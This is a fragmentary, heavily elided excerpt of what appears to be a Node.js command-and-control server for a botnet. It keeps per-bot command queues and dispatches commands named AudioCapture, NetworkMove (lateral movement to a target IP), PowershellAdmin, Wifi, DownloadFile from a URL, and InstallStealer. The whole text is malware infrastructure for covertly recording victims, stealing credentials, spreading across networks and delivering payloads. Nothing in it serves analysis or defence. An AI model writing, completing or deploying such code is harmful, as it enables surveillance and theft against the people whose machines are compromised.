...
const storage = multer.diskStorage({
  ...
  filename: (req, file, cb) => {
    ...
    const currentChannel = channels.find(
      (channel) => channel.botId === req.body.botId,
    );
...
function sendCommand(command) {
  ...
  const targetChannel = channels.find(
    (channel) => channel.botId === command.botId,
  );
  ...
  switch (command.name) {
    ...
    case "AudioCapture":
      ...
      const audioCaptureCommand = new AudioCapture({
        length: command.args.length,
    ...
    case "NetworkMove":
      ...
      const networkMoveCommand = new NetworkMove({
        targetIp: command.args.targetIp,
      });
    ...
    case "PowershellAdmin":
      ...
      console.log(command);
      const powershellAdminCommand = new PowershellAdmin({
    ...
    case "Wifi":
      ...
      const wifiListCommand = new Wifi();
    ...
    case "DownloadFile":
      logger.info("Adding DownloadFile command");
      const downloadCommand = new DownloadFile({ url: command.args.url });
      targetChannel.commands.push(downloadCommand);
      break;
    case "InstallStealer":
      logger.info("Adding InstallStealer command");
      break;
...
function popCommand(botId) {
  ...
  if (!targetChannel) {
    logger.warn(
      "No channel found for bot : " + botId + " -> aborting pop command.",
    );
